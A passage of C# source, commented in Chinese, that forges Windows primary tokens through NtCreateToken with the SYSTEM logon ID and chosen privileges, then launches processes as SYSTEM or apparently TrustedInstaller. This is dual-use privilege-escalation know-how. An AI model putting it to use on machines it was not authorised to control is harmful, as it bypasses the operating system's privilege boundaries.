            if (!SetTokenInformation(token, TokenSessionId, ref sessionId, sizeof(uint)))
                throw new Win32Exception(Marshal.GetLastWin32Error(),
                    "SetTokenInformation(TokenSessionId) 失败，需要 SeTcbPrivilege");
        }

        /// <summary>
        /// [修复#28] 构建 DefaultDacl: SYSTEM + Administrators + Owner 全部 GENERIC_ALL
        /// </summary>
        static IntPtr BuildDefaultDacl(IntPtr sidOwner, out IntPtr[] daclSidPtrs)
        {
            IntPtr sidSystem = IntPtr.Zero, sidAdmins = IntPtr.Zero;
            daclSidPtrs = null;

            if (!ConvertStringSidToSid("S-1-5-18", out sidSystem))
                throw new Win32Exception();
            if (!ConvertStringSidToSid("S-1-5-32-544", out sidAdmins))
            {
                LocalFree(sidSystem);
                throw new Win32Exception();
            }

            daclSidPtrs = new[] { sidSystem, sidAdmins };

            // ACL 大小: ACL头(8) + 3个ACE(每个 = 8 + SID长度)
            uint aclSize = 8
                + (8 + GetLengthSid(sidSystem))
                + (8 + GetLengthSid(sidAdmins))
                + (8 + GetLengthSid(sidOwner));

            IntPtr pAcl = Marshal.AllocHGlobal((int)aclSize);
            try
            {
                if (!InitializeAcl(pAcl, aclSize, ACL_REVISION))
                    throw new Win32Exception();
                if (!AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, sidSystem))
                    throw new Win32Exception();
                if (!AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, sidAdmins))
                    throw new Win32Exception();
                if (!AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, sidOwner))
                    throw new Win32Exception();
                return pAcl;
            }
            catch
            {
                Marshal.FreeHGlobal(pAcl);
                throw;
            }
        }

        public static SafeTokenHandle CreatePrimaryToken(
            string userSidString,
            (string sid, GroupAttributes attr)[] groupSids,
            (string name, PrivilegeAttributes attr)[] privileges,
            TimeSpan? expiry)
        {
            IntPtr sidUser = IntPtr.Zero;
            IntPtr bufUser = IntPtr.Zero, bufGroups = IntPtr.Zero, bufPrivs = IntPtr.Zero;
            IntPtr pSqos = IntPtr.Zero;
            IntPtr pDefaultDacl = IntPtr.Zero;        // [修复#28]
            IntPtr[] daclSidPtrs = null;              // [修复#28]
            IntPtr[] sidPtrs = null;

            try
            {
                if (!ConvertStringSidToSid(userSidString, out sidUser))
                    throw new Win32Exception();

                bufUser   = BuildTokenUser(sidUser);
                bufGroups = BuildTokenGroups(groupSids, out sidPtrs);
                bufPrivs  = BuildTokenPrivileges(privileges);

                var owner        = new TOKEN_OWNER { Owner = sidUser };
                var primaryGroup = new TOKEN_PRIMARY_GROUP { PrimaryGroup = sidUser };

                // [修复#28] 构建真实的 DefaultDacl
                pDefaultDacl = BuildDefaultDacl(sidUser, out daclSidPtrs);
                var defaultDacl = new TOKEN_DEFAULT_DACL { DefaultDacl = pDefaultDacl };

                // SYSTEM_LUID
                var authId = new LUID { LowPart = 0x3e7, HighPart = 0 };

                if (!AllocateLocallyUniqueId(out var srcId))
                    throw new Win32Exception();
                var source = new TOKEN_SOURCE
                {
                    SourceName       = "OptTok",
                    SourceIdentifier = srcId
                };

                var expiryLi = expiry.HasValue
                    ? new LARGE_INTEGER { QuadPart = DateTime.UtcNow.Add(expiry.Value).ToFileTimeUtc() }
                    : new LARGE_INTEGER { QuadPart = long.MaxValue - 1 };

                // SQOS
                var sqos = new SECURITY_QUALITY_OF_SERVICE
                {
                    Length             = Marshal.SizeOf<SECURITY_QUALITY_OF_SERVICE>(),
                    ImpersonationLevel = 2,
                    ContextTrackingMode = 0,
                    EffectiveOnly      = 0
                };
                pSqos = Marshal.AllocHGlobal(Marshal.SizeOf<SECURITY_QUALITY_OF_SERVICE>());
                Marshal.StructureToPtr(sqos, pSqos, false);

                var objAttr = new OBJECT_ATTRIBUTES
                {
                    Length                   = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
                    SecurityQualityOfService = pSqos
                };

                int status = NtCreateToken(
                    out var hToken,
                    TOKEN_ALL_ACCESS,
                    ref objAttr,
                    TOKEN_TYPE.TokenPrimary,
                    ref authId,
                    ref expiryLi,
                    bufUser,
                    bufGroups,
                    bufPrivs,
                    ref owner,
                    ref primaryGroup,
                    ref defaultDacl,
                    ref source);

                if (status != 0)
                {
                    int winErr = (int)NtStatusHelper.RtlNtStatusToDosError(status);
                    throw new Win32Exception(winErr,
                        $"NtCreateToken 失败，NTSTATUS=0x{status:X8}");
                }

                return hToken;
            }
            finally
            {
                if (bufUser      != IntPtr.Zero) Marshal.FreeHGlobal(bufUser);
                if (bufGroups    != IntPtr.Zero) Marshal.FreeHGlobal(bufGroups);
                if (bufPrivs     != IntPtr.Zero) Marshal.FreeHGlobal(bufPrivs);
                if (pSqos        != IntPtr.Zero) Marshal.FreeHGlobal(pSqos);
                if (pDefaultDacl != IntPtr.Zero) Marshal.FreeHGlobal(pDefaultDacl);  // [修复#28]
                LocalFreeIfNotNull(sidUser);
                if (sidPtrs != null)
                    foreach (var s in sidPtrs) LocalFreeIfNotNull(s);
                if (daclSidPtrs != null)                                              // [修复#28]
                    foreach (var s in daclSidPtrs) LocalFreeIfNotNull(s);
            }
        }

        static IntPtr BuildTokenUser(IntPtr sid)
        {
            var tu = new TOKEN_USER
            {
                User = new SID_AND_ATTRIBUTES { Sid = sid, Attributes = 0 }
            };
            IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_USER>());
            Marshal.StructureToPtr(tu, buf, false);
            return buf;
        }

        static IntPtr BuildTokenGroups(
            (string sid, GroupAttributes attr)[] entries,
            out IntPtr[] sidPtrs)
        {
            int count = entries.Length;
            int hdr = (int)Marshal.OffsetOf<TOKEN_GROUPS_LAYOUT>(
                          nameof(TOKEN_GROUPS_LAYOUT.FirstGroup));
            int ent = Marshal.SizeOf<SID_AND_ATTRIBUTES>();
            IntPtr buf = Marshal.AllocHGlobal(hdr + ent * count);

            sidPtrs = new IntPtr[count];
            bool success = false;

            try
            {
                Marshal.WriteInt32(buf, count);
                IntPtr ptr = IntPtr.Add(buf, hdr);

                for (int i = 0; i < count; i++)
                {
                    if (!ConvertStringSidToSid(entries[i].sid, out var s))
                        throw new Win32Exception();
                    sidPtrs[i] = s;
                    var saa = new SID_AND_ATTRIBUTES
                    {
                        Sid        = s,
                        Attributes = (uint)entries[i].attr
                    };
                    Marshal.StructureToPtr(saa, ptr, false);
                    ptr = IntPtr.Add(ptr, ent);
                }

                success = true;
                return buf;
            }
            finally
            {
                if (!success)
                {
                    Marshal.FreeHGlobal(buf);
                    for (int i = 0; i < count; i++)
                    {
                        LocalFreeIfNotNull(sidPtrs[i]);
                        sidPtrs[i] = IntPtr.Zero;
                    }
                }
            }
        }

        static IntPtr BuildTokenPrivileges(
            (string name, PrivilegeAttributes attr)[] privs)
        {
            int count = privs.Length;
            int hdr   = Marshal.SizeOf<TOKEN_PRIVILEGES_HEADER>();
            int ent   = Marshal.SizeOf<LUID_AND_ATTRIBUTES>();
            IntPtr buf = Marshal.AllocHGlobal(hdr + ent * count);
            bool success = false;

            try
            {
                Marshal.WriteInt32(buf, count);
                IntPtr ptr = IntPtr.Add(buf, hdr);

                foreach (var (name, attr) in privs)
                {
                    if (!NtStatusHelper.LookupPrivilegeValue(null, name, out var luid))
                        throw new Win32Exception();
                    var la = new LUID_AND_ATTRIBUTES
                    {
                        Luid       = luid,
                        Attributes = (uint)attr
                    };
                    Marshal.StructureToPtr(la, ptr, false);
                    ptr = IntPtr.Add(ptr, ent);
                }

                success = true;
                return buf;
            }
            finally
            {
                if (!success) Marshal.FreeHGlobal(buf);
            }
        }

        static class NtStatusHelper
        {
            [DllImport("ntdll.dll")]
            internal static extern uint RtlNtStatusToDosError(int status);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            internal static extern bool LookupPrivilegeValue(
                string system, string name, out LUID luid);
        }
    }

    // ========================================================================
    //  ProcessLauncher
    // ========================================================================
    static class ProcessLauncher
    {
        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        const uint CREATE_NEW_CONSOLE        = 0x00000010;
        const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;  // [修复#27]
        const uint LOGON_WITH_PROFILE         = 0x00000001;

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessAsUser(
            SafeTokenHandle hToken, string lpApplicationName, string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithTokenW(
            SafeTokenHandle hToken,
            uint dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // [修复#29] 为令牌创建专属环境块
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(
            out IntPtr lpEnvironment, SafeTokenHandle hToken, bool bInherit);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        /// <summary>
        /// 用 CreateProcessAsUser 启动进程（Phase2 使用，调用方已是 SYSTEM）
        /// 需要 SeAssignPrimaryTokenPrivilege + SeIncreaseQuotaPrivilege
        /// </summary>
        public static void Launch(SafeTokenHandle token, string application)
        {
            var sa = new SECURITY_ATTRIBUTES
            {
                nLength              = Marshal.SizeOf<SECURITY_ATTRIBUTES>(),
                lpSecurityDescriptor = IntPtr.Zero,
                bInheritHandle       = 0
            };

            var si = new STARTUPINFO
            {
                cb        = Marshal.SizeOf<STARTUPINFO>(),
                lpDesktop = "WinSta0\\Default"
            };

            // [修复#29] 为 TI 令牌创建环境块
            IntPtr envBlock = IntPtr.Zero;
            bool envCreated = CreateEnvironmentBlock(out envBlock, token, false);
            if (!envCreated)
            {
                Console.WriteLine("  [!] CreateEnvironmentBlock 失败，使用继承环境");
                envBlock = IntPtr.Zero;
            }

            try
            {
                // [修复#26] 工作目录 = System32，避免 TI 无权访问用户目录
                // [修复#27] CREATE_UNICODE_ENVIRONMENT 确保环境变量正确传递
                if (!CreateProcessAsUser(
                        token, application, null,
                        ref sa, ref sa, false,
                        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
                        envBlock,
                        @"C:\Windows\System32",
                        ref si, out var pi))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error(),
                        "CreateProcessAsUser 失败");
                }

                Console.WriteLine($"  [+] 进程已启动: {application} (PID={pi.dwProcessId})");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            finally
            {
                if (envBlock != IntPtr.Zero)
                    DestroyEnvironmentBlock(envBlock);
            }
        }

        /// <summary>
        /// [修复#21] 用 CreateProcessWithTokenW 启动进程（Phase1 使用）
        /// 只需要 SeImpersonatePrivilege（Admin 默认有）
        /// </summary>
        public static void LaunchWithToken(SafeTokenHandle token, string application, string arguments)
        {
            var si = new STARTUPINFO
            {
                cb        = Marshal.SizeOf<STARTUPINFO>(),
                lpDesktop = "WinSta0\\Default"
            };

            string cmdLine = $"\"{application}\" {arguments}";

            if (!CreateProcessWithTokenW(
                    token,
                    LOGON_WITH_PROFILE,
                    null,
                    cmdLine,
                    CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out var pi))
            {
                int err = Marshal.GetLastWin32Error();
                string hint = err == 1314
                    ? "（需要 SeImpersonatePrivilege，请以管理员身份运行）"
                    : err == 1058
                    ? "（Secondary Logon 服务未运行，请执行: sc start seclogon）"
                    : "";
                throw new Win32Exception(err,
                    $"CreateProcessWithTokenW 失败 {hint}");
            }

            Console.WriteLine($"  [+] 进程已启动: {application} (PID={pi.dwProcessId})");
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
